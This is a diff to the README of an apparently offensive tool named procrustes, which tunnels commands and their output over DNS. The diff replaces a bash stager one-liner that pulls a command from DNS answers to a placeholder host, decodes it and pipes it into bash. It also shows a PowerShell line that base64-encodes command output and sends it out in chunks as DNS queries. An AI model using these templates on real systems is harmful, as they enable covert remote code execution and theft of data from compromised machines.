@@ -71,7 +71,7 @@ procroustes_full/bash:
 ```
 procroustes_full/bash/staged:
 ```bash
-while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(dig +short $i.%UNIQUE_DNS_HOST%);c=$(printf %02x ${a[*]}|xxd -r -p);done|bash
+(seq %ITERATIONS%|%S_DNS_TRIGGGER% $(cat).%UNIQUE_DNS_HOST%|tr . \ |printf %02x $(cat)|xxd -r -p)|bash
 ```
 
 ---------------------------------------
@@ -79,7 +79,7 @@ while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(d
 
 |                       | procroustes_chunked                | procroustes_full  |  procroustes_full_staged (experimental)  |
 | -------------         |:-------------:               |:-----:         |:-----:         |
-| payload size overhead (bash/powershell) [1] | 150\*NLABELS/500\*NLABELS (+CMD_LEN)          | 300/750 (+CMD_LEN)       |   250/❌  |
+| payload size overhead (bash/powershell) [1] | 150\*NLABELS/500\*NLABELS (+CMD_LEN)          | 300/750 (+CMD_LEN)       |   150/❌  |
 | dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[2] |   1👌          |                1    |
 | speed (bash/powershell)                | ✔/✔                         |  ✔/😔         | ✓/❌|
 
@@ -98,8 +98,8 @@ A workaround to avoid running into issues for the aforementioned cases is to fir
 
 ### Todos
  - Create a wrapper script, that will contain variables (e.g. host=a, dns_trigger=b, dispatcher=c ...) and will translate them to procrustes commands (e.g. ./procrustes_full.sh -h a -d b -x c -- "$1")
- - ~~we could achieve constant command length by sending initially a "stager" command, which will then get our full command through DNS responses.~~ (done for bash)
- - Add stagers for sh (could be a massage of the bash stager), powershell (something similar with [this](https://github.com/no0be/DNSlivery/blob/731ace1eb35b7499cc7b95e22816a371507cbd40/dnslivery.py#L136))
+ - ~~add stagers for constant payload size.~~ (done for sh/bash)
+ - Add stager for powershell (something similar with [this](https://github.com/no0be/DNSlivery/blob/731ace1eb35b7499cc7b95e22816a371507cbd40/dnslivery.py#L136))
  - procroustes_full/powershell command can use some parallelization:
  ```bash
 [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd})))+'--' -split '(.{1,%CHUNK_SIZE%})'|?{$_}|%{$i+=1;%DNS_TRIGGER% $('{0}{1}{2}' -f ($_ -replace '(.{1,%LABEL_SIZE%})','$1.'),$i,'%UNIQUE_DNS_HOST%')}
